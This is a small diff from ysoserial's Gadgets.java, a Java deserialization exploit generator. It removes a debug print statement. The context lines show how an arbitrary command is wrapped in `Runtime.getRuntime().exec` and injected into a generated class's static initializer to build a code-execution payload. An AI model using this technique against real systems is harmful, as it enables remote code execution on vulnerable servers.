@@ -132,7 +132,6 @@ public class Gadgets {
             }
             stringBuilder.append("}");
             String cmd = String.format("java.lang.Runtime.getRuntime().exec(%s);", stringBuilder.toString());
-            System.out.println(cmd);
             clazz.makeClassInitializer().insertAfter(cmd);
             // sortarandom name to allow repeated exploitation (watch out for PermGen exhaustion)
             clazz.setName("ysoserial.Pwner" + System.nanoTime());
